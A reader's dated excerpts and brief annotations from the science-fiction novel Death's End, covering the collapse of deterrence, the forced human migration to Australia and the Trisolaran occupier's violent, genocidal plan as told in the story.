<p>现在，一个蓄谋已久的精巧计划显现出来：威慑控制权交接的具体时间在五个月前就已确定，那时跟随“万有引力”号的智子还没有进入盲区，随行的两个水滴已经接到在交接完成后立刻摧毁“万有引力”号的指令。</p>
<p>2016-01-26</p>
<p>智子把长刀向后一扬，准确地插入背上的鞘中，“我要走了，请代我向罗辑博士表达三体世界的敬意，他是一个强大的威慑者，伟大的战士。另外，如果有机会，也请向托马斯·维德先生表示遗憾。”</p>
<p>智子的最后一句话让程心吃惊地抬起头来。“知道吗？在我们的人格分析系统中，你的威慑度在百分之十上下波动，像一条爬行的小蚯蚓；罗辑的威慑度曲线像一条凶猛的眼镜蛇，在百分之九十高度波动；而维德……”智子遥望着烟尘后面落得只剩一角的夕阳，眼中透出明显的恐惧，然后用力摇摇头，仿佛正努力从自己的脑子中赶走什么，“他根本没有曲线，在所有外部环境参数下，他的威慑度全顶在百分之一百，那个魔鬼！如果他成为执剑者，这一切都不会发生，和平将继续，我们已经等了六十二年，都不得不继续等下去，也许再等半个世纪或更长。那时，三体世界只能同在实力上已经势均力敌的地球文明战斗，或妥协……但我们知道，人们肯定会选择你的。</p>
<p>威慑后六十天，失落的世界</p>
<p>2016-01-26</p>
<p>在威慑中止后的第三十八天，运行在小行带外侧的林格-斐兹罗观测站发现，三体星系附近朝太阳系方向的星际尘埃云中出现了飞船航迹，共四百一十五条，显然，三体世界向太阳系派出了第二支舰队。</p>
<p>2016-01-26</p>
<p>这支舰队应该是五年前派出的，在四年前穿过了尘埃云。这是三体世界一个相当冒险的行动，因为如果不能在起航后的第五年摧毁人类的黑暗森林威慑系统，舰队穿过尘埃云被发现后可能引发威慑操作。这说明，早在那时，对于人类世界对黑暗森林威慑心态的转变，以及可能选择什么样的第二任执剑人，三体世界已经有了准确的预测。</p>
<p>历史似乎又回到了起点，新的轮回开始了。</p>
<p>2016-01-26</p>
<p>在威慑中止后，人类世界的前途再次陷入一片黑暗之中，但同两个多世纪前第一轮危机开始时一样，人们并没有把这种黑暗同自己的命运联系起来。从尘埃云中的航迹分析，第二支三体舰队的速度与第一支没有太大差别，即使后面会有更高的加速，舰队到达太阳系也在两三个世纪以后，现在活着的人们都能够平安地度过自己的一生。有了大低谷的教训，人类社会不会再次为了未来而牺牲现在。</p>
<p>但这一次人类没有那么幸运。在三体舰队驶出尘埃云后仅三天，观测系统竟然在第二片尘埃云中发现了航迹，也是四百一十五条！这不可能是更早时候派出的另一支舰队，只能是几天前发现的那同一支舰队。第一支三体舰队从第一片尘埃云到达第二片用了五年，而第二支舰队只用了六天！</p>
<p>三体舰队达到了光速！</p>
<p>2016-01-26</p>
<p>从对第二片尘埃云中航迹的分析也证明了这件事。那四百一十五条航迹以每秒三十万千米的光速延伸，在光速飞船的冲击下，那些航迹十分醒目。</p>
<p>从时间上看，舰队在穿过第一片尘埃云时立刻进入光速，其间竟没有加速过程。如果这样，三体第二舰队应该已经到达了太阳系。可以说它们几乎到达了。现在，使用中型天文望远镜，也可以看到距太阳六千个天文单位处的太空中的一片亮点，有四百一十五个。那是三体舰队减速时推进器的火焰，但这却是常规推进器，这时，舰队已经脱离光速，速度骤降至光速的百分之十五。显然这是允许常规推进在到达太阳系前充分减速的最高速度，按照这个速度和舰队减速率计算，三体第二舰队到达太阳系还需一年左右的时间。</p>
<p>这确实是一件令人费解的事：三体舰队显然能够在极短的时间内达到或脱离光速，但它们却不敢在三体星系或太阳系附近这么做。舰队起航后，用了整整一年时间以常规速度航行，直到与三体星系相距六千个天文单位时才进入光速；在距太阳系同样距离处脱离光速降至常规推进速度，这段距离光速航行只需一个月，舰队却不惜再花一年的时间用常规推进航行。这样，第二舰队的航行时间比完全光速航行整整多出了两年。</p>
<p>2016-01-26</p>
<p>能想到的解释只有一个：这是为了避免四百一十五艘飞船进入光速时对两个世界产生影响。这个安全距离是地球到海王星距离的两百倍，如果在这个距离上才能避免飞船对行星的影响，那就意味着引擎产生的能量比恒星还高两个数量级！这实在难以想象。</p>
<p>2016-01-26</p>
<p>三体世界的技术爆炸</p>
<p>三体世界的技术发展是从什么时候由匀速变为爆炸式加速的，这一直是个谜。有学者认为这种加速早在危机纪元开始前就出现了，也有人认为三体世界的技术是晚至威慑纪元才出现飞跃的。对于三体技术爆炸的动因，人们的看法倒是比较一致，认为主要有两个方面：首先，地球文明对三体世界产生了巨大的影响，在这一点上三体人可能没有撒谎。自第一个智子到达地球后，大量涌入的人类文化使三体世界发生了深刻的变化。人类的部分价值观得到认同：发现了为应对乱纪元的灾难而产生的极权体制对科学的阻碍，思想自由得到鼓励，个体的价值得到尊重——这些都有可能在那个遥远的世界引发类似文艺复兴的思想启蒙运动，进而产生科技的飞跃，这一定是一段辉煌的历史，但其具体的过程却不得而知。</p>
<p>另一个可能只是猜测：飞向宇宙其他方向的智子并非像三体人所说的一无所获，在进入盲区前，它们很可能至少探测了一个文明世界。如果是这样，三体世界从这个第三方文明中得到的可能不仅仅是技术知识，还有关于宇宙黑暗森林状态的重要信息。那样的话，不管在哪个方面，三体世界现在都比地球所知道的多得多。</p>
<p>2016-01-26</p>
<p>直到这时，人们仍然幻想着至少一代人的平安生活，所以在智子的讲话发表后，没有一个国家响应，更没有人开始移民。</p>
<p>在史称“保留地声明”的讲话发表五天后，一直在地球大气层内巡行的五个水滴中的一个攻击了北美、欧洲和亚洲的三座大城市。攻击的目的并不是毁灭城市，只是恐吓。它径直穿过城市的巨树森林，沿途撞击悬挂在树枝上的建筑，那些被击中的建筑先是熊熊燃烧，然后像烂掉的果实一般从几百米高度坠落到地面，造成三十多万人死亡，这是自末日战役后最惨重的人类伤亡事件。</p>
<p>2016-01-27</p>
<p>智子再次发表讲话，声称三体世界之所以改变对人类文明的灭绝政策，完全是出于对地球文化的热爱和敬意。向澳大利亚的移民完成后，会有一段艰难的日子，但只是短暂的三四年，当三体舰队到达后，完全有能力使澳大利亚的四十亿人过上舒适的生活。同时，占领者还将帮助人类建造火星和太空中的居住空间，在舰队到达五年后就可以向火星和太空大规模移民，十五年后就能基本完成。那时，人类将拥有相对而言足够大的生存空间，两个文明将在太阳系开始新的和平生活。但这一切，都要以第一次移民的顺利进行为前提。如果向澳大利亚的移民不立即开始，水滴将继续攻击城市。在一年的期限后，任何处于保留地之外的人类都将被当做三体领土的入侵者而消灭。当然，只要人类离开城市呈疏散状态，仅凭五个水滴是做不到这一点的，它们不可能把分散在各大陆上的一个个或一小群一小群的人全部杀死，但在四年后，到达太阳系的三体舰队无疑能够做到这一点。</p>
<table>
<thead>
<tr>
<th>注</th>
<th>云天明和三体谈判的结果</th>
</tr>
</thead>
<tbody>
<tr>
<td></td>
</tr>
</tbody>
</table>
<p>2016-01-27</p>
<p>“是灿烂辉煌的地球文化为人类赢得了生存的机会，希望你们珍惜。”智子最后说。</p>
<table>
<thead>
<tr>
<th>注</th>
<th>云天明的贡献</th>
</tr>
</thead>
<tbody>
<tr>
<td></td>
</tr>
</tbody>
</table>
<p>威慑后第一年，澳大利亚</p>
<p>2016-01-27</p>
<p>移民区的生活是艰苦的，但在最初的日子里，到来的移民数量不多，还可以忍受。与物质生活的艰苦相比，更糟糕的还是来自人的骚扰。程心和AA最初是两个人住一间简易房，但随着移民的增加，房间里的人数渐渐增加到八个。另外六个女人都是在天堂一般的威慑纪元出生的，在这里，到处是她们平生第一次见到的事物：食品和水的定量配给，没有信息墙壁甚至没有空调的房间、公共厕所和公共浴室、上下铺……这是一个绝对平均的社会，钱没有用，所有人得到的配给都完全一样。她们以前只在历史电影中看到过这些，移民区的生活对她们而言是地狱般的折磨，程心自然就成了这些人发泄的对象。她们动不动就对她恶语相向，骂她是废物，没能威慑住三体世界，最该死的是在接到攻击警报后放弃了威慑操作，否则引力波广播一启动，三体人就吓跑了，至少还有几十年的好日子过，即使广播启动后地球立即毁灭，也比到这鬼地方受罪强。开始她们只是骂，后来发展到对程心动手动脚，甚至抢夺她的配给品。</p>
<p>2016-01-27</p>
<p>但AA却拼命保护她的朋友，她像个小泼妇一样一天与那六个女人打好几次架，有一次抓住一个最凶女人的头发往上下铺的床柱上撞，把那人撞得血流满面，那几个女人这以后才再不敢轻易惹她和程心了</p>
<p>2016-01-27</p>
<p>但憎恨程心的并不止这几个人，周围的移民也经常来骚扰，他们有时朝这间房子扔石头，有时一大群人围住房子齐声叫骂。对这些，程心都坦然接受了——这些甚至对她是一种安慰，作为失败的执剑人，她觉得自己应该付出比这更大的代价。</p>
<p>2016-01-27</p>
<p>孩子，人做过的，神都记着。”</p>
<p>是的，人做过的别说神，人自己都还记着。五个世纪前，文明的地球人登上了这块大陆（尽管大部分是欧洲的犯人），在丛林中把土著当成野兽射杀，后来发现他们是人不是兽，仍照杀不误。澳大利亚土著已经在这片广阔的土地上生活了几万年，白人来的时候澳大利亚还有五十万土著，但很快就被杀得只剩三万，直至逃到澳大利亚西部的荒凉沙漠中才幸免于难……其实，当智子发表保留地声明时，人们都注意到她用了Reservation这个词，这是当年对印第安保留地的称呼，那是在另一块遥远的大陆上，文明的地球人到达那里后，印第安人的命运比澳大利亚土著更悲惨。</p>
<p>2016-01-27</p>
<p>弗雷斯笑着摇摇头，说她跳的不是澳大利亚土著的舞，是毛利人的，外来的人常把这两者搞混，但他们很不同，前者温顺，后者是凶悍的战士；而就算是毛利人的舞她跳得也不对，没把握住其精神。说着，老人用颜料在自己脸上涂了起来，很快涂成一张生动的脸谱，然后脱下上衣，露出了黝黑的胸膛上与年龄不相称的结实肌肉，从墙角拿了一根货真价实的长矛，为她们跳起了毛利战士的舞蹈。他的表演立刻像勾了魂似的把她们吸引住了，弗雷斯平时的和善宽厚消失得无影无踪，瞬间变成一个咄咄逼人的凶煞恶神，浑身上下充满了雄壮剽悍的攻击力，他的每一声怒吼、每一次跺脚，都使窗玻璃嗡嗡作响，令人不由得发抖。最令她们震撼的还是他的眼睛，睁得滚圆，灼热的怒火和冰冷的杀气喷涌而出，凝聚了大洋洲雷电和飓风的力量，那目光仿佛在惊天动地地大喊：不要跑！我要杀了你！！我要吃了你！！！</p>
<p>2016-01-27</p>
<p>跳完舞，弗雷斯又恢复了平时的和善模样，他说：“一个毛利勇士，关键就是要盯住敌人的眼睛，先用眼睛打败他，再用长矛杀死他。”他走到程心面前，意味深长地看着她，“孩子，你没有盯住敌人的眼睛。”他轻轻拍拍程心的肩膀，“但，这不怪你，真的不怪你。”</p>
<p>2016-01-27</p>
<p>那次谋杀未遂后，托马斯·维德被判刑三十年，现在，他所在的监狱刚迁到澳大利亚的查尔维尔。</p>
<p>当程心见到维德时，他正在干活，把一个用做仓库的简易房的窗子用合成板封住。他的一只袖管是空的，在这个时代，本来很容易接一只功能与正常手臂差不多的假肢的，不知为什么他没有那么做。有两个显然也是公元人的男犯人冲程心轻佻地打口哨，但看到程心要找的人后他们立刻变得老实了，都赶紧垂头干活，好像对刚才的举动有些后怕。</p>
<p>2016-01-27</p>
<p>走近维德后，程心有些惊奇地发现，虽然在服刑，还是在这样艰苦的地方，他反而变得比她上次看到时整洁了许多，他的胡子刮得很干净，头发梳得整齐有形。这个时代的犯人已经不穿囚服了，但他的白衬衣是这里最干净的，甚至比那三个狱警都干净。他嘴里含着几颗钉子，每次用左手将一颗钉子按进合成板里，然后拿起锤子利落有力地把钉子敲进去。他看了程心一眼，脸上的冷漠没有丝毫变化，继续在沉默中干活。</p>
<p>2016-01-27</p>
<p>程心看到这人第一眼时就知道，他没有放弃，他的野心和理想，他的阴险，还有许许多多程心从来不知道的东西，什么都没有放弃。</p>
<p>程心向维德伸出一只手来，他看了她一眼，放下锤子，把嘴里咬着的钉子放到她手中，然后她递一颗钉子，他就钉一颗，直到程心手中的钉子都钉完了，他才打破沉默。</p>
<p>2016-01-27</p>
<p>“我是说离开澳大利亚，在移民完成前快走。”维德低声说，他说这话时嘴唇几乎不动，眼睛盯着正在钉的合成板，稍远些的人都会以为他在专心干活。</p>
<table>
<thead>
<tr>
<th>注</th>
<th>因为完成移民之后的事情是…</th>
</tr>
</thead>
<tbody>
<tr>
<td></td>
</tr>
</tbody>
</table>
<p>2016-01-27</p>
<p>同三个世纪前的许多次一样，维德又是以一句简短的话让程心呆住了。每次，他都像是扔给她一个致密的线团，她得一段一段把线团拆开才能领会其中复杂的含义。但这一次，维德的话让她立刻不寒而栗，她甚至没有胆量去拆那线团。</p>
<p>“走吧。”维德没有给程心提问的时间，紧接着说，然后转向她，短暂地露出他特有的那种冰水般的微笑，“这次是让你离开这儿。”</p>
<table>
<thead>
<tr>
<th>注</th>
<th>维德作为公元前的地球人思维无限接近了三体和黑暗森林的本质。  另一个是逻辑，逻辑认识到了黑暗森林之后，便再也不是以前的逻辑了。</th>
</tr>
</thead>
<tbody>
<tr>
<td></td>
</tr>
</tbody>
</table>
<p>2016-01-27</p>
<p>在回沃伯顿的路上，程心看到了大地上密集得望不到边的简易房，看到了在房屋之间的空地上忙碌的密密麻麻的人群。突然，她感到自己的视角发生了变化，像从世界之外看着这一切，而这一切也突然变得像一个熙熙攘攘的蚁窝。这个诡异的视角使她处于一种莫名的恐惧之中，一时间，澳大利亚明媚的阳光也带上了冷雨的阴森。</p>
<p>2016-01-27</p>
<p>自从末日战役后，太阳系舰队再也没有恢复到那样庞大的规模，在威慑中止时，舰队只有一百多艘恒星级战舰。虽然技术在发展，但战舰的速度一直没有提高，似乎核聚变推进已经达到了极限。现在，三体舰队的压倒优势不仅仅在于它们能够达到光速，最可怕之处还在于它们根本不经加速就能够直接跃迁至光速；而人类的战舰如果考虑燃料的消耗以保证返航的话，加速到最高的百分之十五光速可能需要一年的时间，与三体飞船相比，慢得像蜗牛。</p>
<p>2016-01-27</p>
<p>威慑中止时，太阳系舰队的一百多艘恒星级战舰本来有机会逃脱到外太空，如果当时所有战舰朝不同的方向全速逃离，太阳系中的八个水滴很难追上它们。但没有一艘战舰这样做，都按智子的命令返回了火星轨道，理由很简单：移民到火星，与地球上向澳大利亚的移民不同，一百万人在火星基地的封闭城市中仍能继续文明舒适的生活，因为基地本来的设计就能够容纳这么多人长期生活。与永远流浪外太空相比，这无疑是一个更好的选择。</p>
<p>2016-01-27</p>
<p>太空中的移民在三个月内就完成了，月球轨道内的五十万人返回地球进入澳大利亚，太阳系舰队的一百万人移居火星。这时，太阳系的太空中已经没有人了，只有空荡荡的太空城和战舰飘浮在地球、火星和木星轨道上，飘浮在荒凉的小行星带中，仿佛是一片寂静的金属坟墓，埋葬着人类的光荣与梦想。</p>
<p>2016-01-27</p>
<p>智子从背后拔出武士刀，以快得几乎让人看不清的动作连挥三下，将刚爬上垛顶的三个人都砍成了两截。那三个人被砍的方式惊人地一致，都是刀从左肩进右肋出，被斜斜地劈开，那六块半截人体向垛下飞去，还在半空，里面的内脏已经溢出散开，同飞扬的血瀑一起，噼里啪啦地落在人群中。在一片恐惧的惊叫和哭号中，智子从垛顶凌空跳下，落到人群中，再次闪电般地砍杀起来，转眼间已经砍倒了十几个人。人群惊恐地后退，很快在她的周围清出了一块空地，就像一滴洗洁精落到盘中的油汤里一般。空地上那十几具尸体也都同前面三人一样，被从左肩到右肋斜斜地劈开，这是让血和内脏最快流出的方式。在那一大片血红面前，人群中的一部分被吓得晕倒在地。智子向前走去，人们惊慌地闪开，她的身体似乎带着一圈无形的力场，把人群排斥开来，始终在自己周围保持着一圈空地。她走了几步站住了，人群再次凝固。</p>
<p>“排队。”智子说，这次声音不高。人群很快变成了长长的队列，仿佛在运行一个数组排序程序一样。队列一直延伸到远处的巨型帐篷那儿，还绕着它转了一圈。</p>
<p>2016-01-27</p>
<p>智子纵身一跃，跳回了食品垛的顶上，用滴血的长刀指着下面的队列说：“人类自由堕落的时代结束了，要想在这里活下去，就要重新学会集体主义，重新拾起人的尊严！</p>
<p>2016-01-27</p>
<p>程心走到弗雷斯身边坐下，她很喜欢同老人在一起，他那种对苦难现实的超然犹如镇痛剂一般安抚着她那颗破碎的心。老人从不看电视，也不关心地球上正在发生的任何事。每天夜里，他几乎不回自己的房间，就坐在这里靠着门廊的木柱入睡，直到朝阳照到身上时才醒来，甚至在暴雨之夜他都这样，说这儿比床上睡得舒服。他曾经说，如果有一天政府的那帮杂种来把房子收走，他不会去移民区，在树丛中搭一个遮雨的小草棚就能过下去。AA说，他这把年纪那样不行的，他说，祖先行，他就行。早在第四纪冰河期，他的祖先就从亚洲划着独木舟漂过太平洋来到这里，那可是四万年前，希腊呀埃及呀连影子还没有呢。他说自己在21世纪曾是一名富有的医生，在墨尔本有自己的诊所，威慑纪元苏醒后也一直过着舒适的现代生活，但就在移民开始时，他体内的某种东西复苏了，突然感觉自己其实是大地和丛林中的动物，领悟到生活所需要的东西其实是那么少，感觉睡在露天就很好，很舒服。</p>
<p>2016-01-27</p>
<p>那时可没这么挤，据说一个白人向另一个白人买牧场，只需付一箱威士忌的钱，然后买家在日出时骑快马跑出去，日落时回来，这一大圈围住的土地就归他了。”</p>
<p>2016-01-27</p>
<p>想到维德，程心就把一个月前维德对她说的那句话告诉了弗雷斯，她早就想对他说这事，但又怕打扰了他超然的心境。</p>
<p>“我知道这人。”弗雷斯说，“孩子，我肯定地说你应该听他的，但你又不可能离开澳大利亚，所以不要想这事了。想不可能的事有什么用？”</p>
<p>2016-01-27</p>
<p>弗雷斯似乎不想再谈这个话题，但看到程心在黑暗中沉默着，似乎期待他发表更多的看法，就接着说：“我是一个骨科医生，你可能知道，断了的骨头长好后，愈合的断裂处长得比原来还粗，这在医学上叫超量恢复，是说如果人体有机会弥补以前缺少的某些东西，那么这些东西可能恢复到比不缺少它们的人更多。与人类相比，他们——”他指指星空，“他们曾经缺什么你是知道的，他们超量恢复了吗？恢复到什么程度？谁也不清楚。”</p>
<p>程心被这话震撼了，但弗雷斯似乎没有继续讨论的兴趣</p>
<p>2016-01-27</p>
<p>所有的部落都已消失，</p>
<p>所有的长矛都已折断。在这里，</p>
<p>我们曾经饮露餐花，而你们，</p>
<p>却撒下一片砾石。”</p>
<p>2016-01-27</p>
<p>智子要求人类进行裸移民，这也是威慑纪元中地球世界的鹰派曾对三体世界移民太阳系提出过的设想。除了建筑材料和建造新的农业工厂的大型部件，以及必需的生活用品和医疗设备，移民不得携带任何军用和民用的重型装备，各国前往移民区的军队也只能配备有限的维持秩序用的轻武器，人类被彻底解除了武装。</p>
<p>2016-01-27</p>
<p>移民初期，澳大利亚政府是无可指摘的，他们和全体澳大利亚人做出了巨大的努力来安置移民。但随着各大洲的移民如洪水般拥进澳大利亚，这个曾经是地球上唯一独占一块大陆的国家心理开始失衡，澳大利亚原住民社会民怨沸腾，新上台的政府开始对移民奉行强硬政策。他们很快发现，现在澳大利亚联邦对其余国家的优势，与三体对地球世界的优势也差不多了。后来的移民大都被安置在荒凉的内地，像新南威尔士州这样富庶的沿海地带，被划为澳大利亚的“保留领土”，禁止移民，堪培拉和悉尼被划为“保留城市”，也禁止移民定居，于是，移民能够长期居住的大城市只剩下墨尔本。澳大利亚政府也开始变得颐指气使，以人类家长自居，渐渐凌驾于联合国和各国政府之上。</p>
<p>虽然新南威尔士州禁止移民，但很难阻止内地移民去旅行。出于对刚刚告别的城市生活的向往，移民大量拥入悉尼，虽然不让定居，但就是在街头流浪也比住在移民村里强，至少让人感觉仍然身处文明世界，这使得城市人满为患。澳大利亚政府决定把移民从悉尼市内驱逐出去，以后也禁止外来移民进入城市，这引起了滞留城中的移民和军警的冲突，造成了一些伤亡。悉尼事件引发了移民对澳大利亚政府早已郁积的众怒，有上亿移民拥进新南威尔士州，拥向悉尼。面对眼前铺天盖地的滚滚人海，州和城市的澳大利亚驻军望风而逃。几千万人涌入悉尼，洗劫了城市，像一个巨大的蚁群覆盖了一具新鲜的动物尸体，很快使其变成白骨架。悉尼市内火光冲天，犯罪横行，变成一个由巨树建筑构成的恐怖森林，生存条件还不如移民区了。</p>
<p>之后，移民大军又把目标转向两百多公里外的堪培拉。由于堪培拉是澳大利亚首都，在移民开始后有一半国家的政府也迁移至此，联合国也刚从悉尼转移到这里，军队不得不进行防守。这一次冲突造成了重大伤亡，死了五十多万人，大部分并非死于军队的火力下，而是死于上亿人的混乱造成的踩踏和饥渴；在这场持续了十多天的大混乱里，有几千万人完全断绝了食物和饮水供应。</p>
<p>2016-01-27</p>
<p>移民社会也发生着深刻的变化。人们发现，在这块拥挤饥饿的大陆上，民主变成了比专制更可怕的东西，所有人都渴望秩序和强有力的政府，原有的社会体制迅速瓦解，人民只希望政府能给他们带来食物、水和能放一张床的生存空间，别的都不在乎了。聚集在这块大陆上的人类社会像寒流中的湖面一样，一块接一块地冻结在极权专制的坚冰之下。智子砍完人后说的那句话成为主流口号，包括法西斯主义在内的形形色色的垃圾，从被埋葬的深坟中浮上表面成为主流。宗教的力量也在迅速恢复，大批的民众聚集在不同的信仰和教会之下，于是，一个比极权政治更老的僵尸——政教合一的国家政权开始出现。</p>
<p>2016-01-27</p>
<p>作为极权政治的必然产物，战争是不可避免的，国家间的冲突频繁起来，开始只是为了抢夺食品和水，后来发展到有计划地争夺生存空间</p>
<p>2016-01-27</p>
<p>堪培拉惨案后，澳大利亚军队有了很强的威慑力，在联合国的要求下，他们开始以强力手段维持国际秩序，如果不是这样，一场澳大利亚版的世界大战已经爆发，而且正如20世纪初有人预言的那样，这场大战是用石头打的。</p>
<table>
<thead>
<tr>
<th>注</th>
<th>爱因斯坦预言的</th>
</tr>
</thead>
<tbody>
<tr>
<td></td>
</tr>
</tbody>
</table>
<p>2016-01-27</p>
<p>在这些阴暗的日子里，无数人早上醒来时都不相信自己真回到了现实。他们发现在仅仅半年的时间里，人类社会倒退了如此长的距离，一只脚甚至已经踏进了中世纪。</p>
<p>2016-01-27</p>
<p>这时，支撑每个人和整个社会免于全面崩溃的，只有一样东西：三体第二舰队。现在，舰队已经越过柯伊伯带，在晴朗的夜晚，有时用肉眼都可以看到舰队减速的光焰。那四百一十五个暗弱的光点，是澳大利亚人类的希望之星。人们牢记着智子的承诺，期望舰队的到来能给这块大陆上的所有人带来安宁舒适的生活，昔日的恶魔变成了拯救天使和唯一的精神支柱，人们祈盼它快些降临。</p>
<p>2016-01-27</p>
<p>随着移民的进行，在澳大利亚以外的地球各大陆的夜晚，一座座城市陷入黑暗中，变成了死寂的空城，就像最后的晚餐结束时豪华餐厅中一盏接一盏熄灭的灯。</p>
<p>2016-01-27</p>
<p>地球治安军是智子为了监督地球移民而招募的人类军队，她许诺参军的人将不参加澳大利亚移民，以后可以自由生活在被三体人占领的世界中。招募令发出后报名异常踊跃，据后来的统计，网络上总共出现了十多亿份入伍申请，其中两千万人参加了面试，最后招募了五百万人。这些最后的幸运儿并不在意人们的唾沫和鄙夷的目光，因为他们知道，那些吐唾沫的人中相当一部分是提交过申请的。</p>
<p>2016-01-27</p>
<p>地球治安军分为亚洲、北美和欧洲三个军团，拥有各大国在移民中遗留下来的精良装备。移民初期，治安军的行为还是比较收敛的，只是按照智子的命令督促各国移民的进行，同时保护城市和地区的基础设施不被破坏。但随着澳大利亚困难的加剧，移民进度越来越难以满足智子的要求，在她的命令和威胁下，治安军变得越来越疯狂，不惜大规模动用武力来强迫移民，在世界各地造成了上百万人的死亡。最后，当移民期限过后，智子下达了消灭保留区外所有人类的命令，治安军彻底变成了魔鬼。他们驾驶着飞行车端着激光狙击枪，在空寂的城市和原野上像猎鹰一样盘旋，见人就杀。</p>
<p>2016-01-27</p>
<p>与治安军相反，地球抵抗运动是人类在这场烈火中炼出的真金。他们有许多分支，数量很难统计，据估计在一百五十万至两百万人之间。他们分散在深山和城市的地下，与治安军展开游击战，并等待着同踏上地球的三体侵略者的最后战斗。在人类历史上所有沦陷区的抵抗组织中，地球抵抗组织付出的牺牲是最大的，因为治安军有水滴和智子的协助，抵抗组织每一次作战行动都近乎于自杀，同时也使得他们不可能进行任何大规模的集结，这就为治安军对他们各个击破创造了条件</p>
<p>2016-01-27</p>
<p>地球抵抗运动的构成很复杂，包括各个阶层的人，其中有很大比例是公元人。六名执剑人候选人都是抵抗运动的指挥官，移民结束时，其中的三人已经在战斗中牺牲，只剩下加速器工程师毕云峰、物理学家曹彬和原海军中将安东诺夫。</p>
<p>所有抵抗运动的成员都知道他们在进行的是一场毫无希望的战斗，将来三体舰队到达地球之日，也就是他们全军覆灭之时。这些在深山和城市的下水道中衣衫褴褛饥肠辘辘的战士，是在为人类最后的尊严而战，他们的存在，是人类这段不堪回首的历史中唯一的亮色。</p>
<p>2016-01-27</p>
<p>路的两侧人山人海，各种物品一片狼藉。新到的移民没有住处，只能露宿在外，人们现在大多被刚才的爆炸声惊起来，不安地望着烟柱升起的方向。晨光把一切都笼罩在一片阴郁的暗蓝中，在这暗蓝之中，人们的面孔更显苍白。程心又有那种从高处看蚁穴的怪异感觉，在这大片的苍白面孔中穿行，她潜意识中感到太阳不会再升起来了。一阵恶心和虚弱袭来，她刹住了车，靠在路边干呕起来，呕得眼泪都流出来胃才平和下来。她听到近处有孩子在哭，抬头看去，一个坐在路边一堆毯子中抱着孩子的母亲，头发蓬乱一脸憔悴，任孩子抓挠一动不动，呆滞地看着东方，晨曦使她的双眼发亮，但透出的只有茫然和麻木。</p>
<p>程心想起了另一位母亲，美丽健康，充满活力，在联合国大厦前把可爱的婴儿放到自己的怀抱里，叫自己圣母……她和那个孩子现在在哪儿？</p>
<p>2016-01-27</p>
<p>在通过大门前军警的警戒线时，程心说明了自己是谁才被允许通过，那名军官并不能确定她的身份，扫描了她的身份证后才放行。当确定她是谁时，他的眼神让程心铭心刻骨，那眼神在说：</p>
<p>当初我们为什么选择了你？</p>
<p>2016-01-27</p>
<p>进入市政厅后，程心找回了一些超信息时代的感觉，她看到在大帐篷中宽阔的空间里，飘浮着许多全息信息窗口，它们悬浮在众多的官员和工作人员上方。这些人显然已彻夜不眠，都显得疲惫不堪，但也都很忙碌。许多部门都集中在这里，显得十分拥挤，让程心想起公元世纪华尔街的股票交易大厅。人们在悬浮于面前的信息窗口上点击书写，然后窗口会自动飘浮到下一个处理程序的人面前，这些发光的窗口像一群来自刚刚消逝的时代的幽灵，这里是它们最后的聚集地。</p>
<p>2016-01-27</p>
<p>在一间用合成板隔起来的小办公室里，程心见到了市长。他很年轻，女性化的清秀面庞上像别人一样满是疲惫，还有一丝迷离和恍惚。眼前的重负，显然不是他们这脆弱的一代能够承受的。</p>
<p>2016-01-27</p>
<p>智子站在主席台上，她仍身着迷彩服围着黑巾，但没带武士刀。这一年来，她脸上那种美艳的冷酷消失了，显得容光焕发。她对会场鞠了一躬，程心又看到了两年前那个温柔的茶道女人的影子。</p>
<p>2016-01-27</p>
<p>“对地球的去威胁化将继续进行，这三个月的时间，保留地必须处于低技术的农业社会状态，禁止使用包括电力在内的任何现代技术。各位都已看到，治安军正在系统地拆除澳大利亚所有的发电设施。”</p>
<p>程心周围的人们都互相交换着目光，每个人都希望别人帮助自己把握智子最后一段话中的含义，因为那太令人难以置信了。“这是屠杀！”会场中有人声嘶力竭地喊道，所有的影子仍在摇晃，像绞架上的尸体。</p>
<p>这是屠杀。本来，四十二亿人在澳大利亚生活并不是一件难以想象的事，移民完成后，澳大利亚的人口密度为每平方公里五百多人，比移民前日本的人口密度高不太多。</p>
<p>先前设想中，人类在澳大利亚的生存是以高效率生产的农业工厂为基础的，在移民的过程中，有大批农业工厂也迁移到澳大利亚，一部分已经重新装配完成。在农业工厂里，经过基因改造的农作物以高出传统农作物几十倍的速度生长，但自然的光照不可能为这种生长提供足够的能量，只能使用人工产生的超强光照，这就需要大量的电力。一旦电力中断，在这些农业工厂的培养槽中，那些能够吸收紫外线甚至X射线进行光合作用的农作物，将在一两天内腐烂。</p>
<p>2016-01-27</p>
<p>而现有的存粮，只够四十二亿人维持一个月。</p>
<p>2016-01-27</p>
<p>“那粮食呢？！粮食从哪里来？！”又有人喊道，他们对智子的恐惧已经消失，只剩下极度的绝望。</p>
<p>智子环视大厅中所有的人，“粮食？这不都是粮食？每个人看看你们的周围，都是粮食，活生生的粮食。”智子是很平静地说出这话的，好像真的是在提醒人们被遗忘的粮仓。</p>
<p>没有人说话，一个策划已久的灭绝计划已经走到了最后一步，现在说什么都晚了。智子继续说：“在即将到来的生存竞争中，大部分人将被淘汰，三个月后舰队到达之时，这个大陆上将剩下三千万至五千万人，这些最后的胜利者将在保留地开始文明自由的生活。地球文明之火不会熄灭，但也只能维持一个火苗，像陵墓中的长明灯。”</p>
<p>2016-01-27</p>
<p>“生存本来就是一种幸运，过去的地球上是如此，现在这个冷酷的宇宙中也到处如此。但不知从什么时候起，人类有了一种幻觉，认为生存成了唾手可得的东西，这就是你们失败的根本原因。进化的旗帜将再次在这个世界升起，你们将为生存而战，我希望在座的每个人都在那最后的五千万人之中，希望你们能吃到粮食，而不是被粮食吃掉。</p>
<p>2016-01-27</p>
<p>刚才程心就有些奇怪，智子知道AA，但怎么会也知道弗雷斯呢？他们三人在这一年中确实一直得到了足够的配给，弗雷斯的房子也没有像其他当地人的房子那样被征用，还有，自从她和AA搬进来后，再没有人到这里骚扰过她。程心一直以为这是当地政府对自己的照顾，现在才知道是智子一直在关心她。程心当然清楚，在四光年外控制智子的肯定是一个群体，但她与其他人一样，总是把她当成一个个体，一个女人。</p>
<p>这个正在杀死四十二亿人的女人却在关心她这一个人。“如果你留在那里，最后会被别人吃掉的。”智子说。</p>
<p>“我知道。”程心淡淡地回答。似乎有一声叹息，“好吧，有一个智子会一直在你附近，如果你改变主意或需要什么帮助时，直接说出来我就能听到。”</p>
<p>程心沉默了，最终没有说谢谢。有人抓住了她的胳膊，是那个治安军指挥官，“我刚接到带那两人走的命令，你放心，程心博士。你还是离开的好，这是我个人的请求，这里很快就要变成人间地狱了。”</p>
